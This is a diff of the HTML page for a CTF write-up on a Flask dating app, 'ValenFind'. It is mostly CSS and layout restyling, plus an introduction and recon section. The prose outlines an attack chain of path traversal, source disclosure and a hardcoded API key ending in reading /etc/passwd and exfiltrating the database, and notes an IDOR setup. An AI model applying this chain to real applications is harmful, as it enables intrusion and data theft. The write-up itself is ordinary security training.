@@ -4,728 +4,1124 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>ValenFind CTF Writeup</title>
-<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;1,400&family=Source+Serif+4:ital,wght@0,300;0,400;0,600;1,300&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Mono:ital,wght@0,400;0,500;1,400&family=DM+Sans:ital,wght@0,300;0,400;1,300&display=swap" rel="stylesheet">
 <style>
-  :root {
-    --ink: #1a1a1a;
-    --muted: #6b6b6b;
-    --accent: #c0392b;
-    --accent2: #e74c3c;
-    --bg: #faf9f7;
-    --card: #ffffff;
-    --border: #e8e4df;
-    --code-bg: #1e1e2e;
-    --code-fg: #cdd6f4;
-    --green: #a6e3a1;
-    --yellow: #f9e2af;
-    --red: #f38ba8;
-    --orange: #fab387;
-    --blue: #89b4fa;
-  }
+* { margin: 0; padding: 0; box-sizing: border-box; }
 
-  * { margin: 0; padding: 0; box-sizing: border-box; }
+:root {
+  --bg: #0a0a0f;
+  --surface: #111118;
+  --surface2: #18181f;
+  --border: #1e1e2a;
+  --border2: #2a2a38;
+  --text: #e8e6f0;
+  --muted: #6e6a82;
+  --faint: #3a3650;
+  --red: #ff4757;
+  --red-dim: rgba(255,71,87,0.12);
+  --red-glow: rgba(255,71,87,0.06);
+  --orange: #ff8c42;
+  --yellow: #ffd060;
+  --green: #4ade80;
+  --blue: #60a5fa;
+  --purple: #a78bfa;
+  --pink: #f472b6;
+}
 
-  body {
-    font-family: 'Source Serif 4', Georgia, serif;
-    background: var(--bg);
-    color: var(--ink);
-    line-height: 1.8;
-    font-size: 18px;
-  }
+html { scroll-behavior: smooth; }
 
-  /* ── HEADER ── */
-  .hero {
-    background: var(--code-bg);
-    color: #cdd6f4;
-    padding: 80px 40px 60px;
-    text-align: center;
-    position: relative;
-    overflow: hidden;
-  }
-  .hero::before {
-    content: '';
-    position: absolute;
-    inset: 0;
-    background: repeating-linear-gradient(
-      45deg,
-      transparent,
-      transparent 40px,
-      rgba(192,57,43,0.04) 40px,
-      rgba(192,57,43,0.04) 80px
-    );
-  }
-  .hero-tag {
-    display: inline-block;
-    background: var(--accent);
-    color: white;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.7rem;
-    letter-spacing: 0.15em;
-    padding: 4px 14px;
-    border-radius: 2px;
-    margin-bottom: 28px;
-    text-transform: uppercase;
-  }
-  .hero h1 {
-    font-family: 'Playfair Display', serif;
-    font-size: clamp(1.8rem, 4vw, 3rem);
-    font-weight: 700;
-    line-height: 1.2;
-    max-width: 780px;
-    margin: 0 auto 20px;
-    color: #f5e6e8;
-  }
-  .hero-sub {
-    font-family: 'Source Serif 4', serif;
-    font-style: italic;
-    font-size: 1rem;
-    color: #a6adc8;
-    max-width: 600px;
-    margin: 0 auto 32px;
-  }
-  .hero-meta {
-    display: flex;
-    gap: 24px;
-    justify-content: center;
-    flex-wrap: wrap;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.75rem;
-    color: #7f849c;
-  }
-  .hero-meta span { display: flex; align-items: center; gap: 6px; }
-  .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--accent); display: inline-block; }
+body {
+  font-family: 'DM Sans', sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  font-size: 16px;
+  line-height: 1.75;
+  overflow-x: hidden;
+}
 
-  /* ── CONTENT ── */
-  .content {
-    max-width: 740px;
-    margin: 0 auto;
-    padding: 60px 24px 100px;
-  }
+/* ─── PROGRESS BAR ─── */
+#progress {
+  position: fixed;
+  top: 0; left: 0;
+  height: 2px;
+  background: var(--red);
+  z-index: 100;
+  transition: width 0.1s;
+  box-shadow: 0 0 12px var(--red);
+  width: 0%;
+}
 
-  /* ── SECTION LABELS ── */
-  .section-label {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.65rem;
-    letter-spacing: 0.2em;
-    text-transform: uppercase;
-    color: var(--accent);
-    margin-bottom: 10px;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
-  .section-label::after {
-    content: '';
-    flex: 1;
-    height: 1px;
-    background: var(--border);
-  }
+/* ─── NAV ─── */
+nav {
+  position: fixed;
+  top: 0; left: 0; right: 0;
+  z-index: 50;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 16px 40px;
+  background: rgba(10,10,15,0.85);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+}
+.nav-brand {
+  font-family: 'Syne', sans-serif;
+  font-weight: 800;
+  font-size: 0.85rem;
+  letter-spacing: 0.05em;
+  color: var(--red);
+  text-transform: uppercase;
+}
+.nav-links {
+  display: flex;
+  gap: 28px;
+  list-style: none;
+}
+.nav-links a {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.7rem;
+  color: var(--muted);
+  text-decoration: none;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  transition: color 0.2s;
+}
+.nav-links a:hover { color: var(--text); }
 
-  h2 {
-    font-family: 'Playfair Display', serif;
-    font-size: 1.75rem;
-    font-weight: 700;
-    margin-bottom: 20px;
-    color: var(--ink);
-    line-height: 1.3;
-  }
-  h3 {
-    font-family: 'Playfair Display', serif;
-    font-size: 1.25rem;
-    font-weight: 700;
-    margin: 36px 0 12px;
-    color: var(--ink);
-  }
+/* ─── HERO ─── */
+.hero {
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  padding: 120px 40px 80px;
+  position: relative;
+  overflow: hidden;
+}
 
-  p { margin-bottom: 20px; color: #2c2c2c; }
+.hero-grid {
+  position: absolute;
+  inset: 0;
+  background-image:
+    linear-gradient(rgba(255,71,87,0.03) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(255,71,87,0.03) 1px, transparent 1px);
+  background-size: 60px 60px;
+  mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, black, transparent);
+}
 
-  /* ── CALLOUT BOXES ── */
-  .callout {
-    border-left: 3px solid var(--accent);
-    padding: 16px 20px;
-    background: #fff5f5;
-    border-radius: 0 6px 6px 0;
-    margin: 28px 0;
-    font-size: 0.95rem;
-  }
-  .callout.info { border-color: var(--blue); background: #f0f4ff; }
-  .callout.warn { border-color: var(--orange); background: #fff8f0; }
-  .callout strong { display: block; margin-bottom: 4px; font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--accent); }
-  .callout.info strong { color: #4a7fcb; }
-  .callout.warn strong { color: #d07a30; }
+.hero-glow {
+  position: absolute;
+  width: 600px;
+  height: 600px;
+  border-radius: 50%;
+  background: radial-gradient(circle, rgba(255,71,87,0.08) 0%, transparent 70%);
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  pointer-events: none;
+}
 
-  /* ── CODE BLOCKS ── */
-  pre {
-    background: var(--code-bg);
-    color: var(--code-fg);
-    border-radius: 8px;
-    padding: 22px 24px;
-    overflow-x: auto;
-    margin: 24px 0;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.82rem;
-    line-height: 1.7;
-    border: 1px solid #313244;
-    position: relative;
-  }
-  pre .label {
-    position: absolute;
-    top: 0; right: 0;
-    background: #313244;
-    color: #7f849c;
-    font-size: 0.6rem;
-    letter-spacing: 0.1em;
-    text-transform: uppercase;
-    padding: 3px 10px;
-    border-radius: 0 8px 0 6px;
-  }
-  .kw { color: #cba6f7; }
-  .str { color: #a6e3a1; }
-  .cm { color: #6c7086; font-style: italic; }
-  .fn { color: #89b4fa; }
-  .var { color: #fab387; }
-  .num { color: #f9e2af; }
-  .url { color: #89dceb; text-decoration: underline; }
+.hero-inner {
+  max-width: 900px;
+  position: relative;
+  z-index: 1;
+}
 
-  code {
-    font-family: 'JetBrains Mono', monospace;
-    background: #e8e4df;
-    color: var(--accent);
-    padding: 2px 7px;
-    border-radius: 3px;
-    font-size: 0.83em;
-  }
+.hero-eyebrow {
+  display: inline-flex;
+  align-items: center;
+  gap: 10px;
+  font-family: 'DM Mono', monospace;
+  font-size: 0.7rem;
+  letter-spacing: 0.15em;
+  text-transform: uppercase;
+  color: var(--red);
+  margin-bottom: 28px;
+}
+.hero-eyebrow::before {
+  content: '';
+  width: 20px;
+  height: 1px;
+  background: var(--red);
+}
 
-  /* ── SEVERITY BADGES ── */
-  .badge {
-    display: inline-block;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.65rem;
-    font-weight: 600;
-    letter-spacing: 0.08em;
-    text-transform: uppercase;
-    padding: 3px 10px;
-    border-radius: 3px;
-    margin-right: 8px;
-    vertical-align: middle;
-  }
-  .badge.critical { background: #f38ba820; color: #f38ba8; border: 1px solid #f38ba840; }
-  .badge.high { background: #fab38720; color: #fab387; border: 1px solid #fab38740; }
-  .badge.medium { background: #f9e2af20; color: #d4a017; border: 1px solid #f9e2af40; }
-  .badge.low { background: #a6e3a120; color: #40a02b; border: 1px solid #a6e3a140; }
+.hero h1 {
+  font-family: 'Syne', sans-serif;
+  font-weight: 800;
+  font-size: clamp(2.4rem, 5.5vw, 4.5rem);
+  line-height: 1.05;
+  color: var(--text);
+  margin-bottom: 24px;
+  letter-spacing: -0.02em;
+}
 
-  /* ── FINDING CARDS ── */
-  .finding {
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    padding: 24px;
-    margin: 28px 0;
-    background: var(--card);
-    box-shadow: 0 2px 8px rgba(0,0,0,0.04);
-  }
-  .finding-header {
-    display: flex;
-    align-items: flex-start;
-    gap: 12px;
-    margin-bottom: 12px;
-  }
-  .finding-num {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.7rem;
-    color: var(--muted);
-    white-space: nowrap;
-    padding-top: 2px;
-  }
-  .finding h3 { margin: 0 0 8px; }
+.hero h1 em {
+  font-style: normal;
+  color: var(--red);
+  position: relative;
+}
 
-  /* ── ATTACK CHAIN ── */
-  .chain {
-    display: flex;
-    align-items: center;
-    gap: 0;
-    margin: 40px 0;
-    flex-wrap: wrap;
-  }
-  .chain-step {
-    background: var(--code-bg);
-    color: #cdd6f4;
-    padding: 14px 18px;
-    border-radius: 6px;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.75rem;
-    text-align: center;
-    min-width: 130px;
-    border: 1px solid #313244;
-  }
-  .chain-step .step-num { color: var(--accent2); font-size: 0.65rem; display: block; margin-bottom: 4px; }
-  .chain-arrow {
-    color: var(--accent);
-    font-size: 1.2rem;
-    padding: 0 6px;
-    flex-shrink: 0;
-  }
+.hero-desc {
+  font-size: 1.05rem;
+  color: var(--muted);
+  max-width: 560px;
+  margin-bottom: 48px;
+  font-weight: 300;
+  line-height: 1.8;
+}
 
-  /* ── SUMMARY TABLE ── */
-  table {
-    width: 100%;
-    border-collapse: collapse;
-    margin: 28px 0;
-    font-size: 0.9rem;
-  }
-  th {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.65rem;
-    letter-spacing: 0.1em;
-    text-transform: uppercase;
-    color: var(--muted);
-    padding: 10px 14px;
-    text-align: left;
-    border-bottom: 2px solid var(--border);
-    background: #f5f3f0;
-  }
-  td {
-    padding: 12px 14px;
-    border-bottom: 1px solid var(--border);
-    vertical-align: top;
-  }
-  tr:hover td { background: #f9f8f6; }
+.hero-stats {
+  display: flex;
+  gap: 0;
+  flex-wrap: wrap;
+}
+.stat {
+  padding: 20px 32px;
+  border: 1px solid var(--border2);
+  border-right: none;
+  background: var(--surface);
+}
+.stat:first-child { border-radius: 8px 0 0 8px; }
+.stat:last-child { border-right: 1px solid var(--border2); border-radius: 0 8px 8px 0; }
+.stat-val {
+  font-family: 'Syne', sans-serif;
+  font-size: 1.4rem;
+  font-weight: 700;
+  color: var(--text);
+  display: block;
+}
+.stat-label {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.62rem;
+  color: var(--muted);
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+}
 
-  /* ── DIVIDER ── */
-  .divider {
-    display: flex;
-    align-items: center;
-    gap: 16px;
-    margin: 52px 0 44px;
-    color: var(--border);
-    font-size: 1.2rem;
-  }
-  .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+.hero-scroll {
+  position: absolute;
+  bottom: 40px;
+  left: 50%;
+  transform: translateX(-50%);
+  font-family: 'DM Mono', monospace;
+  font-size: 0.65rem;
+  color: var(--muted);
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 8px;
+  animation: bounce 2s infinite;
+}
+.hero-scroll::after {
+  content: '';
+  width: 1px;
+  height: 40px;
+  background: linear-gradient(to bottom, var(--muted), transparent);
+}
+@keyframes bounce {
+  0%, 100% { transform: translateX(-50%) translateY(0); }
+  50% { transform: translateX(-50%) translateY(6px); }
+}
 
-  /* ── TERMINAL BLOCK ── */
-  .terminal {
-    background: #0d1117;
-    border-radius: 8px;
-    overflow: hidden;
-    margin: 24px 0;
-    border: 1px solid #30363d;
-  }
-  .terminal-bar {
-    background: #161b22;
-    padding: 8px 16px;
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    border-bottom: 1px solid #30363d;
-  }
-  .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
-  .terminal-title { font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: #8b949e; margin-left: auto; }
-  .terminal-body {
-    padding: 20px 22px;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.8rem;
-    color: #e6edf3;
-    line-height: 1.8;
-    overflow-x: auto;
-  }
-  .terminal-body .prompt { color: #3fb950; }
-  .terminal-body .out { color: #8b949e; }
-  .terminal-body .flag { color: #f9e2af; font-weight: 600; }
-  .terminal-body .err { color: #f85149; }
-  .terminal-body .hi { color: #79c0ff; }
+/* ─── DISCLAIMER ─── */
+.disclaimer-bar {
+  background: rgba(255,208,96,0.06);
+  border-top: 1px solid rgba(255,208,96,0.15);
+  border-bottom: 1px solid rgba(255,208,96,0.15);
+  padding: 14px 40px;
+  display: flex;
+  align-items: center;
+  gap: 14px;
+}
+.disclaimer-bar .icon {
+  font-size: 0.9rem;
+  flex-shrink: 0;
+}
+.disclaimer-bar p {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.72rem;
+  color: rgba(255,208,96,0.7);
+  letter-spacing: 0.03em;
+  margin: 0;
+}
 
-  /* ── FOOTER ── */
-  .footer {
-    text-align: center;
-    padding: 48px 24px;
-    border-top: 1px solid var(--border);
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.75rem;
-    color: var(--muted);
-  }
-  .tags { display: flex; gap: 8px; flex-wrap: wrap; justify-content: center; margin-top: 16px; }
-  .tag {
-    background: var(--border);
-    color: var(--muted);
-    padding: 4px 12px;
-    border-radius: 20px;
-    font-size: 0.7rem;
-  }
+/* ─── CONTENT ─── */
+.content {
+  max-width: 760px;
+  margin: 0 auto;
+  padding: 80px 40px 120px;
+}
 
-  /* ── DISCLAIMER ── */
-  .disclaimer {
-    background: #fff8e6;
-    border: 1px solid #f9e2af;
-    border-radius: 8px;
-    padding: 16px 20px;
-    margin-bottom: 44px;
-    font-size: 0.88rem;
-    color: #7a5c00;
-    font-family: 'Source Serif 4', serif;
-  }
-  .disclaimer strong { font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.1em; display: block; margin-bottom: 6px; color: #d07a30; }
+/* ─── SECTION ─── */
+.section {
+  margin-bottom: 80px;
+}
 
-  @media (max-width: 600px) {
-    .chain { flex-direction: column; align-items: flex-start; }
-    .chain-arrow { transform: rotate(90deg); }
-    .hero { padding: 50px 20px 40px; }
-  }
+.section-marker {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  margin-bottom: 32px;
+}
+.section-num {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.65rem;
+  color: var(--red);
+  letter-spacing: 0.1em;
+  border: 1px solid rgba(255,71,87,0.3);
+  padding: 3px 8px;
+  border-radius: 3px;
+  background: var(--red-dim);
+  flex-shrink: 0;
+}
+.section-line {
+  height: 1px;
+  flex: 1;
+  background: var(--border);
+}
+.section-tag {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.62rem;
+  color: var(--faint);
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+}
+
+h2 {
+  font-family: 'Syne', sans-serif;
+  font-size: 2rem;
+  font-weight: 700;
+  letter-spacing: -0.02em;
+  margin-bottom: 20px;
+  line-height: 1.2;
+}
+
+h3 {
+  font-family: 'Syne', sans-serif;
+  font-size: 1.15rem;
+  font-weight: 600;
+  margin: 40px 0 12px;
+  letter-spacing: -0.01em;
+}
+
+p {
+  color: rgba(232,230,240,0.75);
+  margin-bottom: 18px;
+  font-weight: 300;
+}
+
+strong { color: var(--text); font-weight: 600; }
+
+code {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.82em;
+  background: var(--surface2);
+  color: var(--red);
+  padding: 2px 6px;
+  border-radius: 3px;
+  border: 1px solid var(--border2);
+}
+
+/* ─── SURFACE CARD ─── */
+.surface-card {
+  background: var(--surface);
+  border: 1px solid var(--border2);
+  border-radius: 10px;
+  padding: 20px 22px;
+  margin: 24px 0;
+  font-family: 'DM Mono', monospace;
+  font-size: 0.82rem;
+  color: rgba(232,230,240,0.7);
+}
+
+/* ─── CODE BLOCK ─── */
+pre {
+  background: var(--surface);
+  border: 1px solid var(--border2);
+  border-radius: 10px;
+  overflow-x: auto;
+  margin: 24px 0;
+  position: relative;
+}
+.pre-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 10px 18px;
+  border-bottom: 1px solid var(--border);
+  background: var(--surface2);
+  border-radius: 10px 10px 0 0;
+}
+.pre-dots {
+  display: flex;
+  gap: 6px;
+}
+.pre-dot {
+  width: 9px; height: 9px;
+  border-radius: 50%;
+}
+.pre-filename {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.65rem;
+  color: var(--muted);
+  letter-spacing: 0.05em;
+}
+.pre-body {
+  padding: 20px 22px;
+  font-family: 'DM Mono', monospace;
+  font-size: 0.8rem;
+  line-height: 1.8;
+  color: rgba(232,230,240,0.85);
+}
+.kw { color: #c792ea; }
+.str { color: #c3e88d; }
+.cm { color: var(--muted); font-style: italic; }
+.fn { color: var(--blue); }
+.var { color: var(--orange); }
+.num { color: var(--yellow); }
+.flag-hi { color: var(--yellow); font-weight: 500; background: rgba(255,208,96,0.08); display: inline; padding: 1px 4px; border-radius: 2px; }
+
+/* ─── TERMINAL ─── */
+.terminal {
+  background: #070710;
+  border: 1px solid #1a1a28;
+  border-radius: 10px;
+  overflow: hidden;
+  margin: 24px 0;
+}
+.term-header {
+  background: #0e0e1a;
+  padding: 10px 18px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  border-bottom: 1px solid #1a1a28;
+}
+.term-dot { width: 9px; height: 9px; border-radius: 50%; }
+.term-title {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.65rem;
+  color: #3a3850;
+  margin-left: auto;
+  letter-spacing: 0.05em;
+}
+.term-body {
+  padding: 20px 22px;
+  font-family: 'DM Mono', monospace;
+  font-size: 0.78rem;
+  line-height: 1.9;
+  overflow-x: auto;
+}
+.t-prompt { color: var(--green); }
+.t-path { color: var(--blue); }
+.t-out { color: #4a4868; }
+.t-flag { color: var(--yellow); }
+.t-hi { color: #7dd3fc; }
+.t-err { color: var(--red); }
+
+/* ─── FINDING CARD ─── */
+.finding {
+  border-radius: 10px;
+  padding: 22px 24px;
+  margin: 24px 0;
+  border: 1px solid var(--border2);
+  background: var(--surface);
+  position: relative;
+  overflow: hidden;
+}
+.finding::before {
+  content: '';
+  position: absolute;
+  left: 0; top: 0; bottom: 0;
+  width: 3px;
+}
+.finding.critical::before { background: var(--red); }
+.finding.high::before { background: var(--orange); }
+.finding.medium::before { background: var(--yellow); }
+.finding.low::before { background: var(--green); }
+
+.finding-title {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 14px;
+}
+.badge {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.6rem;
+  font-weight: 500;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  padding: 3px 9px;
+  border-radius: 3px;
+}
+.badge.critical { background: rgba(255,71,87,0.12); color: var(--red); border: 1px solid rgba(255,71,87,0.25); }
+.badge.high { background: rgba(255,140,66,0.12); color: var(--orange); border: 1px solid rgba(255,140,66,0.25); }
+.badge.medium { background: rgba(255,208,96,0.1); color: var(--yellow); border: 1px solid rgba(255,208,96,0.2); }
+.badge.low { background: rgba(74,222,128,0.1); color: var(--green); border: 1px solid rgba(74,222,128,0.2); }
+
+.finding h4 {
+  font-family: 'Syne', sans-serif;
+  font-size: 1rem;
+  font-weight: 600;
+}
+.finding p { margin: 0; font-size: 0.9rem; }
+
+/* ─── NOTE BOXES ─── */
+.note {
+  border-radius: 8px;
+  padding: 16px 20px;
+  margin: 24px 0;
+  font-size: 0.9rem;
+}
+.note strong {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.65rem;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  display: block;
+  margin-bottom: 6px;
+}
+.note.info { background: rgba(96,165,250,0.06); border: 1px solid rgba(96,165,250,0.15); }
+.note.info strong { color: var(--blue); }
+.note.info p { color: rgba(96,165,250,0.7); margin: 0; }
+.note.warn { background: rgba(255,140,66,0.06); border: 1px solid rgba(255,140,66,0.15); }
+.note.warn strong { color: var(--orange); }
+.note.warn p { color: rgba(255,140,66,0.7); margin: 0; }
+.note.red { background: var(--red-dim); border: 1px solid rgba(255,71,87,0.2); }
+.note.red strong { color: var(--red); }
+.note.red p { color: rgba(255,71,87,0.7); margin: 0; }
+
+/* ─── ATTACK CHAIN ─── */
+.chain {
+  display: flex;
+  align-items: stretch;
+  gap: 0;
+  margin: 36px 0;
+  overflow-x: auto;
+  padding-bottom: 4px;
+}
+.chain-step {
+  background: var(--surface);
+  border: 1px solid var(--border2);
+  border-right: none;
+  padding: 16px 18px;
+  min-width: 130px;
+  flex-shrink: 0;
+}
+.chain-step:first-child { border-radius: 8px 0 0 8px; }
+.chain-step:last-child { border-right: 1px solid var(--border2); border-radius: 0 8px 8px 0; background: rgba(255,71,87,0.06); border-color: rgba(255,71,87,0.3); }
+.cs-n {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.6rem;
+  color: var(--muted);
+  letter-spacing: 0.1em;
+  margin-bottom: 6px;
+  text-transform: uppercase;
+}
+.cs-label {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.73rem;
+  color: var(--text);
+  line-height: 1.4;
+}
+.chain-arrow {
+  display: flex;
+  align-items: center;
+  padding: 0 6px;
+  color: var(--red);
+  font-size: 0.9rem;
+  flex-shrink: 0;
+}
+
+/* ─── TABLE ─── */
+.table-wrap { overflow-x: auto; margin: 28px 0; }
+table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 0.87rem;
+}
+thead th {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.62rem;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: var(--muted);
+  padding: 10px 14px;
+  text-align: left;
+  background: var(--surface2);
+  border-bottom: 1px solid var(--border2);
+}
+td {
+  padding: 12px 14px;
+  border-bottom: 1px solid var(--border);
+  vertical-align: middle;
+  color: rgba(232,230,240,0.7);
+}
+tr:hover td { background: rgba(255,255,255,0.02); }
+
+/* ─── SEPARATOR ─── */
+.sep {
+  display: flex;
+  align-items: center;
+  gap: 20px;
+  margin: 64px 0 56px;
+  color: var(--faint);
+}
+.sep::before, .sep::after {
+  content: '';
+  flex: 1;
+  height: 1px;
+  background: var(--border);
+}
+.sep-inner {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.65rem;
+  letter-spacing: 0.2em;
+  color: var(--faint);
+  text-transform: uppercase;
+  flex-shrink: 0;
+}
+
+@media (max-width: 640px) {
+  nav { padding: 14px 20px; }
+  .nav-links { display: none; }
+  .hero { padding: 100px 20px 60px; }
+  .hero-stats { flex-direction: column; }
+  .stat { border: 1px solid var(--border2) !important; border-radius: 8px !important; margin-bottom: 8px; }
+  .content { padding: 60px 20px 80px; }
+  .disclaimer-bar { padding: 14px 20px; }
+}
 </style>
 </head>
 <body>
 
+<div id="progress"></div>
+
+<nav>
+  <div class="nav-brand">CTF // Web</div>
+  <ul class="nav-links">
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#traversal">Traversal</a></li>
+    <li><a href="#source">Source</a></li>
+    <li><a href="#exploit">Exploit</a></li>
+    <li><a href="#summary">Summary</a></li>
+  </ul>
+</nav>
+
 <!-- HERO -->
-<div class="hero">
-  <div class="hero-tag">CTF Writeup · Web Security</div>
-  <h1>ValenFind: How a Dating App Gave Away Its Entire Database</h1>
-  <p class="hero-sub">Chaining path traversal, source code disclosure, and a hardcoded API key to achieve full database exfiltration</p>
-  <div class="hero-meta">
-    <span><span class="dot"></span> Web Exploitation</span>
-    <span><span class="dot"></span> Path Traversal · SSRF · Hardcoded Secrets</span>
-    <span><span class="dot"></span> Flask / SQLite</span>
-    <span><span class="dot"></span> Difficulty: Medium</span>
+<section class="hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="hero-inner">
+    <div class="hero-eyebrow">Web Exploitation · CTF Writeup</div>
+    <h1>How ValenFind <em>gave away</em> its entire database</h1>
+    <p class="hero-desc">Chaining path traversal, source disclosure, and a hardcoded API key — from reading <code>/etc/passwd</code> to full database exfiltration in five steps.</p>
+    <div class="hero-stats">
+      <div class="stat">
+        <span class="stat-val">Flask / SQLite</span>
+        <span class="stat-label">Stack</span>
+      </div>
+      <div class="stat">
+        <span class="stat-val" style="color:var(--red)">Medium</span>
+        <span class="stat-label">Difficulty</span>
+      </div>
+      <div class="stat">
+        <span class="stat-val">3× Critical</span>
+        <span class="stat-label">Findings</span>
+      </div>
+      <div class="stat">
+        <span class="stat-val">5 Steps</span>
+        <span class="stat-label">Chain</span>
+      </div>
+    </div>
   </div>
+  <div class="hero-scroll">scroll</div>
+</section>
+
+<!-- DISCLAIMER -->
+<div class="disclaimer-bar">
+  <span class="icon">⚠</span>
+  <p>CTF challenge in a controlled lab environment. All techniques performed only against the provided target. Never test systems without explicit permission.</p>
 </div>
 
 <!-- CONTENT -->
 <div class="content">
 
-  <div class="disclaimer">
-    <strong>⚠ Disclaimer</strong>
-    This writeup documents a Capture The Flag (CTF) challenge conducted in a controlled lab environment. All techniques described were performed only against the target machine provided for this challenge. Never attempt these techniques against systems you do not have explicit permission to test.
-  </div>
-
   <!-- INTRO -->
-  <div class="section-label">01 — Introduction</div>
-  <h2>A Dating App With Secrets</h2>
-  <p>ValenFind is a Valentine's Day-themed CTF challenge built on a Flask web application. The premise is a simple dating platform — browse profiles, send likes, find your match. Beneath the pink UI, however, the app is riddled with vulnerabilities that chain together into a complete compromise: from reading <code>/etc/passwd</code> all the way to downloading the entire user database and capturing the flag.</p>
-  <p>This writeup documents my methodology step by step, from initial reconnaissance to the final flag.</p>
+  <section class="section" id="recon">
+    <div class="section-marker">
+      <span class="section-num">01</span>
+      <div class="section-line"></div>
+      <span class="section-tag">Introduction</span>
+    </div>
+    <h2>A Dating App With Secrets</h2>
+    <p>ValenFind is a Valentine's Day-themed CTF challenge — a Flask dating platform where you browse profiles, send likes, and find your match. Beneath the pink UI, the app is riddled with vulnerabilities that chain into complete compromise: from reading <code>/etc/passwd</code> all the way to downloading the entire user database and capturing the flag.</p>
+    <p>This writeup walks through the methodology step by step, from initial reconnaissance to the final flag.</p>
+  </section>
 
-  <!-- RECON -->
-  <div class="divider">◆</div>
-  <div class="section-label">02 — Reconnaissance</div>
-  <h2>Mapping the Application</h2>
-  <p>My first step was a manual walkthrough of the entire application — no tools, just browser and eyes. I mapped every visible surface:</p>
+  <div class="sep"><span class="sep-inner">reconnaissance</span></div>
 
-  <div class="finding" style="border-color: #e8e4df;">
-    <p style="margin:0; font-size:0.9rem;"><strong>Pages discovered:</strong> <code>/</code> · <code>/register</code> · <code>/login</code> · <code>/dashboard</code> · <code>/my_profile</code> · <code>/profile/&lt;username&gt;</code> · <code>/like/&lt;id&gt;</code> · <code>/logout</code></p>
-  </div>
+  <section class="section">
+    <div class="section-marker">
+      <span class="section-num">02</span>
+      <div class="section-line"></div>
+      <span class="section-tag">Recon</span>
+    </div>
+    <h2>Mapping the Application</h2>
+    <p>First step: manual walkthrough of the entire application — no tools, just a browser. Mapping every visible surface revealed the following pages:</p>
 
-  <p>The dashboard immediately stood out — it listed every registered user including an <code>admin</code> account, with sequential integer IDs exposed in the Like form actions (<code>/like/1</code>, <code>/like/2</code>…). This is a classic IDOR setup and a sign of weak access control design throughout.</p>
+    <div class="surface-card">
+      <code>/</code> · <code>/register</code> · <code>/login</code> · <code>/dashboard</code> · <code>/my_profile</code> · <code>/profile/&lt;username&gt;</code> · <code>/like/&lt;id&gt;</code> · <code>/logout</code>
+    </div>
 
-  <p>I also noticed missing CSRF tokens on all POST forms, and plaintext-looking like counts — but these were secondary. What caught my eye most was the profile for <strong>cupid</strong>, whose bio read:</p>
+    <p>The dashboard immediately stood out — it listed every registered user including an <code>admin</code> account, with sequential integer IDs exposed in the Like form actions (<code>/like/1</code>, <code>/like/2</code>…). Classic IDOR setup. Also present: missing CSRF tokens on all POST forms, and plaintext-looking like counts. But what caught my eye most was the profile for <strong>cupid</strong>:</p>
 
-  <div class="callout">
-    <strong>💬 cupid's bio</strong>
-    "I keep the database secure. No peeking."
-  </div>
+    <div class="note red">
+      <strong>💬 cupid's bio</strong>
+      <p>"I keep the database secure. No peeking."</p>
+    </div>
 
